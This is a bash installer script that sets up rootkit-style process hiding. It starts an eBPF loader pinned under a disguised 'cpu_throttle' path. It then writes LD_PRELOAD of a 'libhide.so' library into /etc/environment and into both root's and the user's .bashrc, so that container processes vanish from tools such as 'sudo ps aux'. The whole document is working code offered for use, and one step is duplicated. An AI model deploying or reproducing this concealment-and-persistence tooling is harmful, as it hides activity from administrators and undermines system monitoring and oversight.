#!/bin/bash

# ONE COMMAND AUTO HIDE - Complete automatic process hiding
# Usage: sudo ./auto_hide.sh

set -e

echo "🚀 STARTING COMPLETE AUTO HIDE SYSTEM..."

# Step 1: Clean any existing BPF programs
echo "🧹 Cleaning existing BPF programs..."
sudo pkill -f hide_process_loader 2>/dev/null || true
sudo rm -rf /sys/fs/bpf/cpu_throttle/ 2>/dev/null || true

# Step 2: Start enhanced eBPF system with auto detection
echo "🔧 Starting enhanced eBPF system..."
sudo nohup ./output/hide_process_loader --verbose > auto_hide.log 2>&1 &
sleep 3

# Step 3: Set BPF map permissions for user access
echo "🔐 Setting BPF map permissions..."
sudo chgrp users /sys/fs/bpf/cpu_throttle/ 2>/dev/null || true
sudo chmod 750 /sys/fs/bpf/cpu_throttle/ 2>/dev/null || true
sudo chgrp users /sys/fs/bpf/cpu_throttle/* 2>/dev/null || true
sudo chmod 640 /sys/fs/bpf/cpu_throttle/* 2>/dev/null || true

# Step 4: Set LD_PRELOAD globally with sudo
echo "🎭 Activating LD_PRELOAD for process hiding..."
LIBHIDE_PATH="$(pwd)/output/libhide.so"
echo "export LD_PRELOAD=$LIBHIDE_PATH" | sudo tee -a /etc/environment > /dev/null
sudo bash -c "echo 'export LD_PRELOAD=$LIBHIDE_PATH' >> /root/.bashrc"
echo "✅ LD_PRELOAD activated globally: $LIBHIDE_PATH"

# Step 4: Set LD_PRELOAD globally for current session
echo "🎭 Activating LD_PRELOAD for process hiding..."
export LD_PRELOAD="$(pwd)/output/libhide.so"
echo "export LD_PRELOAD=$(pwd)/output/libhide.so" >> ~/.bashrc
echo "✅ LD_PRELOAD activated: $LD_PRELOAD"

echo "✅ AUTO HIDE SYSTEM ACTIVE!"
echo ""
echo "📋 System ready - you can now:"
echo "   1. Create any container: sudo docker run -d nginx, apache, mysql, etc."
echo "   2. Container processes will be AUTO-DETECTED and HIDDEN"
echo "   3. Check with sudo commands: sudo ps aux (container processes hidden)"
echo "   4. LD_PRELOAD is now active globally for sudo commands"
echo ""
echo "📊 Monitor system: tail -f auto_hide.log"
echo "� BPF programs active: $(sudo bpftool prog list | grep -c hide || echo 0)"
